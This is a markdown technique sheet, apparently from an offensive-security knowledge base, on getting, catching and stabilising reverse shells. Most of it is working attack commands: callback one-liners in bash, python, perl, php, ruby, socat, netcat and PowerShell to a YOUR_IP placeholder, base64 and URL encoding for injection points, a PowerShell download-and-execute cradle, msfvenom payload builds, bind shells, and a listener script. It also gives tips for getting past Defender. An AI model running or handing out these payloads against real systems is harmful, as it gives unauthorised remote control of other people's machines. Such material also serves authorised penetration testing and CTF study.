---
title: "Reverse Shells - Getting One, Stabilising It, and Egress-Constrained Alternatives"
category: misc
subcategory: post-exploitation
type: technique
tags: [reverse-shell, bind-shell, netcat, pty-upgrade, socat, pwncat, powershell, bash, python, listener, egress-filtering, stabilisation, post-exploitation]
difficulty: easy
summary: "Fire a reverse shell in any available language, catch it on a listener, upgrade it to a full PTY, and fall back to bind/HTTP/DNS shells when egress is filtered."
when_to_use:
  - "You have command execution and want an interactive shell"
  - "Your netcat shell has no job control, no arrow keys, and breaks on Ctrl-C"
  - "Outbound connections are filtered and your reverse shell will not connect back"
  - "You are on Windows and need a PowerShell callback"
tools: [netcat, socat, pwncat, python3, powershell, msfconsole, rlwrap]
related: [net-pivoting-tunnelling, ad-windows-privesc, svc-admin-interfaces-rce]
---

## TL;DR

A reverse shell connects *from* the target back to your listener (good against inbound firewalls).
Fire it in whatever language the box has, catch it with `nc`/`pwncat`/`socat`, then upgrade the dumb
shell to a real PTY so you get job control, tab completion and a working editor. If egress is
filtered, switch to allowed ports, a bind shell, or an HTTP/DNS tunnel.

## Recognise it

- You have RCE (command injection, upload, deserialization) but only one-shot command output.
- Your shell echoes commands twice, dies on Ctrl-C, and `su`/`ssh` complain "must be run from a terminal".

## Attack

### Listeners

```bash
# Plain netcat listener
nc -lvnp 4444

# rlwrap wraps nc for arrow keys / history in the dumb shell
rlwrap nc -lvnp 4444

# socat listener that allocates a PTY (gives a much better shell immediately)
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# pwncat-cs: auto-stabilises, handles upload/download, persistence
pwncat-cs -lp 4444

# metasploit multi/handler for a msfvenom payload
msfconsole -q -x "use multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```

### Linux/Unix reverse shells

```bash
# bash /dev/tcp (no external binary needed)
bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'

# sh fallback
sh -i >& /dev/tcp/YOUR_IP/4444 0>&1

# mkfifo (works where bash /dev/tcp is unavailable)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc YOUR_IP 4444 > /tmp/f

# netcat with -e (only if the build supports it)
nc -e /bin/sh YOUR_IP 4444

# python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'

# perl
perl -e 'use Socket;$i="YOUR_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# php
php -r '$s=fsockopen("YOUR_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("YOUR_IP",4444);loop{c.write((STDIN.tty??`#{c.gets.chomp}`:c.gets).to_s)}' 2>/dev/null || ruby -rsocket -e 'c=TCPSocket.new("YOUR_IP",4444);$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);exec"/bin/sh -i"'

# socat with a full PTY (pair with the socat listener above)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:YOUR_IP:4444

# busybox
busybox nc YOUR_IP 4444 -e /bin/sh
```

### PTY upgrade (the important part)

```bash
# 1. spawn a pty on the target
python3 -c 'import pty;pty.spawn("/bin/bash")'
#   (or:  script -qc /bin/bash /dev/null   or   perl -e 'exec "/bin/bash";')

# 2. background the shell
#    Ctrl-Z

# 3. on YOUR box: disable local echo/line buffering, then foreground
stty raw -echo; fg
#    (press Enter once or twice)

# 4. fix the terminal environment inside the shell
export TERM=xterm-256color
export SHELL=/bin/bash

# 5. set rows/cols to match your terminal (get them on your box with `stty size`)
stty rows 50 cols 200
```

You now have Ctrl-C, arrow keys, tab completion and can run `vim`/`ssh`/`su`. The socat method
(socat listener + socat pty payload) gives the same result in one step.

### Encoding for injection points

```bash
# base64-wrap a bash payload so shell metacharacters do not break the injection
echo -n 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' | base64
# deliver as:
echo -n YOUR_B64 | base64 -d | bash

# URL-encoded form for a web parameter (spaces -> %20, & -> %26, etc.)
# curl 'http://t/vuln?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FYOUR_IP%2F4444%200%3E%261%27'
```

### Windows / PowerShell

```powershell
# PowerShell one-liner TCP client reverse shell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('YOUR_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"

# nc.exe if it is on the box
nc.exe YOUR_IP 4444 -e cmd.exe

# base64-encoded PowerShell (UTF-16LE) for delivery through a parameter
# powershell -nop -enc <base64-of-utf16le-command>
```

```bash
# Build the UTF-16LE base64 for -enc on your Linux box
CMD='IEX(New-Object Net.WebClient).DownloadString("http://YOUR_IP/s.ps1")'
echo -n "$CMD" | iconv -t UTF-16LE | base64 -w0
# deliver as:  powershell -nop -enc <output>
```

msfvenom payloads:

```bash
# Windows staged reverse shell as an exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o s.exe

# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o s.elf

# A WAR for Tomcat manager
msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f war -o s.war
```

### Egress-constrained alternatives

```bash
# Try well-known allowed ports first (443, 80, 53 usually pass egress filters)
bash -c 'bash -i >& /dev/tcp/YOUR_IP/443 0>&1'

# BIND shell (target listens, you connect in) -- when outbound is fully blocked but inbound is not
nc -lvnp 4444 -e /bin/sh          # on the target
nc -nv TARGET_IP 4444             # from your box
# socat bind with a PTY:
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sane   # target

# If only HTTP works: use a web/HTTP shell or upgrade a webshell to a reverse shell
# If only DNS resolves outbound: use a DNS tunnel (see net-dns-attacks: dnscat2/iodine)
```

## Code

A listener that catches a shell and prints the exact stabilisation steps, then tries to auto-set the
window size -- handy so you never fumble the `stty` dance.

```python
#!/usr/bin/env python3
"""Reverse-shell catcher that prints the PTY-upgrade recipe with your real term size.

Usage:
    python3 catch.py [port]
Then in the caught shell run the printed steps.
"""
from __future__ import annotations

import shutil
import socket
import sys
import threading


def pump(src: socket.socket, dst_write) -> None:
    """Forward bytes from a socket to a writable stream until closed."""
    try:
        while True:
            data = src.recv(4096)
            if not data:
                break
            dst_write(data)
    except OSError:
        pass


def main(argv: list[str]) -> int:
    port = int(argv[1]) if len(argv) > 1 else 4444
    cols, rows = shutil.get_terminal_size((200, 50))

    print("=" * 60)
    print("Once the shell connects, upgrade it with:")
    print("  python3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
    print("  [Ctrl-Z]")
    print("  stty raw -echo; fg")
    print("  export TERM=xterm-256color")
    print(f"  stty rows {rows} cols {cols}")
    print("=" * 60)

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(1)
    print(f"[*] listening on 0.0.0.0:{port} ...")
    conn, addr = srv.accept()
    print(f"[+] connection from {addr[0]}:{addr[1]}")

    reader = threading.Thread(
        target=pump, args=(conn, lambda b: sys.stdout.buffer.write(b) or sys.stdout.flush()),
        daemon=True,
    )
    reader.start()
    try:
        for line in sys.stdin.buffer:
            conn.sendall(line)
    except (KeyboardInterrupt, OSError):
        pass
    finally:
        conn.close()
        srv.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
```

## Variants & pitfalls

- **`nc -e` is often missing.** OpenBSD/GNU netcat builds drop `-e`; use the mkfifo or bash
  `/dev/tcp` variants instead.
- **`/dev/tcp` needs bash**, not sh/dash. If `/bin/sh` is dash, call bash explicitly.
- **PTY upgrade order matters.** Ctrl-Z first, `stty raw -echo; fg` on *your* box, then Enter. Get it
  wrong and the terminal jams -- run `reset` to recover.
- **Window size.** Wrong rows/cols make `vim`/`less` render garbage; set them from `stty size`.
- **Egress filtering.** If nothing connects back, the box may only allow 80/443/53 outbound, or
  nothing at all -- move to a bind shell or a tunnel over the allowed protocol.
- **Quoting through web injections.** base64-wrap the payload so `&`, `>`, spaces and quotes survive.
- **Windows AMSI/Defender.** In real environments the plain PowerShell one-liner is caught; in CTF
  boxes it usually works. Prefer a downloaded script or a compiled payload if the inline one dies.
- **Stability.** `pwncat-cs` and the socat PTY method survive Ctrl-C and give upload/download for free.

## Tools

- `nc` / `ncat` / `socat` -- listeners and payloads.
- `pwncat-cs` -- auto-stabilising catcher with file transfer and persistence.
- `rlwrap` -- readline for dumb shells.
- `python3` / `script` / `perl` -- PTY spawning on the target.
- `msfvenom` + `multi/handler` -- staged/compiled payloads.

## References

- The PayloadsAllTheThings "Reverse Shell Cheat Sheet" concepts (mirrored offline in this KB's
  `net-reverse-shell-cheatsheet`).
- `man socat`, `man stty`, `man nc`.
